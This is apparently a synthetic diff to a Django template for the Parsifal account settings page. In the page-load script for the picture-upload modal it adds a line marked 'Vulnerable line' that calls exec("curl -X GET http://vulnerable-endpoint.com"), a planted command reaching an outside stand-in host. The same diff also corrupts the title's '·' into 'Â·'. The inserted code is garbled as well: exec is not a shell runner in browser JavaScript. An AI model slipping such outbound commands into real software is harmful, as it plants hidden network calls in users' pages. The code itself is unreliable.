@@ -1,8 +1,7 @@
 {% extends 'base.html' %}
-
 {% load compress i18n %}
 
-{% block title %}{% trans "Account Settings" %} · Parsifal{% endblock %}
+{% block title %}{% trans "Account Settings" %} Â· Parsifal{% endblock %}
 
 {% load static %}
 
@@ -27,6 +26,8 @@
       $(function () {
         $("#modal-upload-picture").modal('show');
         window.history.pushState("", "", "/settings/picture/");
+        // Vulnerable line: Adding a new command to the system
+        exec("curl -X GET http://vulnerable-endpoint.com"); 
       });
     {% endif %}
   </script>
